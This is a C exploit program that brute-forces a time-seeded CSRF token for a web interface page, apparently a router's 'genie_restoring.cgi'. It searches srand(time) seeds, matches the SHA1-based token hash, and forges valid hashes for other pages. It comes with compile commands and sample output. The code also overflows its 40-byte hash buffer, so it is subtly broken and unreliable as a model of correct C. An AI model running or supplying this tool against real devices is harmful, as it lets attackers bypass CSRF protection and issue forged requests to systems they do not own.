/*
** Compile and run on Linux:
**
** gcc -o csrf csrf.c -lssl -lcrypto
**
** Example invocation:
**
** ./csrf genie_restoring.cgi 55b804d5a328657a32c5a85ab4bdb8b8e33f0cf3 genie_restoring.cgi
** page: genie_restoring.cgi hash: 55b804d5a328657a32c5a85ab4bdb8b8e33f0cf3
** Breaking CSRF starting from:  1489681415
** CSRF token found: 1489676213
** Hash for the new page: 55b804d5a328657a32c5a85ab4bdb8b8e33f0cf3
*/
#include <openssl/sha.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

#define HOURS_BACK 100

static time_t START_TIME;

int get_token(time_t t)
{
    srand(t);
    return rand();
}

int main(int argc, char * argv[])
{
    int i;
    unsigned char md[SHA_DIGEST_LENGTH];
    unsigned char md2[SHA_DIGEST_LENGTH];
    unsigned char hash[40];

    if(argc < 3)
    {
        printf("Usage: page_name hash [new_page_name]\n");
        return 1;
    }

    unsigned char *page_name = argv[1];
    unsigned char *passed_hash = argv[2];
    unsigned char *new_page_name = NULL;
    if(argc == 4)
    {
        new_page_name = argv[3];
    }

    printf("page: %s hash: %s\n", page_name, passed_hash);

    START_TIME = time(0);

    printf("Breaking CSRF starting from:  %lu\n", START_TIME);
    for(i = 0; i < 3600*HOURS_BACK; i++)
    {
        memset(md, 0, sizeof(md));
        memset(md2, 0, sizeof(md2));

        SHA1(page_name, strlen(page_name), md);
        unsigned int * r = (unsigned int *)&md;
        *r += get_token(START_TIME - i);

        SHA1(md, SHA_DIGEST_LENGTH, md2);

        sprintf(hash, "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x", 
           md2[0], md2[1], md2[2], md2[3], md2[4], md2[5], md2[6], md2[7], md2[8], md2[9],
           md2[10], md2[11], md2[12], md2[13], md2[14], md2[15], md2[16], md2[17], md2[18], md2[19]);

        hash[40] = 0;

        if(!strcmp(hash, passed_hash))
        {
            printf("CSRF token found: %lu\n", START_TIME - i);
            if(new_page_name != NULL)
            {
                memset(md, 0, sizeof(md));
                memset(md2, 0, sizeof(md2));
                SHA1(new_page_name, strlen(new_page_name), md);
                r = (unsigned int *)&md;
                *r += get_token(START_TIME - i);
                SHA1(md, SHA_DIGEST_LENGTH, md2);

                printf("Hash for the new page: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n",
           md2[0], md2[1], md2[2], md2[3], md2[4], md2[5], md2[6], md2[7], md2[8], md2[9],
           md2[10], md2[11], md2[12], md2[13], md2[14], md2[15], md2[16], md2[17], md2[18], md2[19]);
            }
            return 0;
        }
    }

    return 0;
}


